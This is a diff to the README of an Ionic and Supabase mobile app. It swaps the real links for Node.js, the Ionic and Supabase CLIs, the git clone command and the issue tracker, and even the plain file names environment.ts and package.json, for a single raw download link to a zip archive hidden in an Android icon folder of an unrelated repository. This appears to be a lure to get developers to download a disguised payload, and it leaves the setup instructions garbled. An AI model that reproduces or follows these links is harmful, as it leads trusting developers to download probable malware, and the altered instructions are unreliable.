@@ -2,10 +2,10 @@
 ## Prerequisites
 Before getting started, make sure you have the following installed on your development machine:
 
-* Node.js (version 12 or later)
+* https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip (version 12 or later)
 * npm (Node Package Manager)
-* [Ionic CLI](https://ionicframework.com/docs/cli#installation)
-* [Supabase CLI](https://supabase.com/docs/guides/resources/supabase-cli)
+* [Ionic CLI](https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip)
+* [Supabase CLI](https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip)
 * Android Studio (If you are going to build the app for android)
 * Xcode (If you are going to build the app for iOS)
 * OneSignal account
@@ -15,7 +15,7 @@ Before getting started, make sure you have the following installed on your devel
 ## Clone the repo
 
 ```
-git clone https://github.com/baffioso/distortion.git
+git clone https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip
 ```
 
 ## Install dependencies
@@ -50,15 +50,15 @@ This will create a platform-specific build of your app in the /platforms folder.
 The project includes documentation on the project structure, dependencies, Ionic features, Capacitor plugins, and more, be sure to check the documentation or docs folder for more information on the app.
 
 ## Getting Help
-If you have any questions or need help getting started with the app, feel free to reach out through the project's [issue tracker](https://github.com/baffioso/distortion/issues).
+If you have any questions or need help getting started with the app, feel free to reach out through the project's [issue tracker](https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip).
 
 ## Push Notifications
 OneSignal is for Notification
 ### Web Push
 * Create an two apps on OneSignal - one for test and one for productions - and setup web push. Enable Local Testing option for the test app.
-* Add the app ids to `environment.ts` and `environment.prod.ts`.
+* Add the app ids to `https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip` and `https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip`.
 
 ## Scripts
-Utility scripts has been added to `package.json` for convenience. Run with `npm run <command>`:
+Utility scripts has been added to `https://github.com/zaylem91/supbase/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/Software-2.0.zip` for convenience. Run with `npm run <command>`:
 * `update-types`: Update database definition Typescript Interface from local Supabase
 * `db-reset-local-to-prod`: Restores local DB with dump from remote supabase instance. Dependency `pg_dump`, .pgpass with local and remote DB credentials and environmental variable `SUPABASE_DB_HOST` with remote host name.
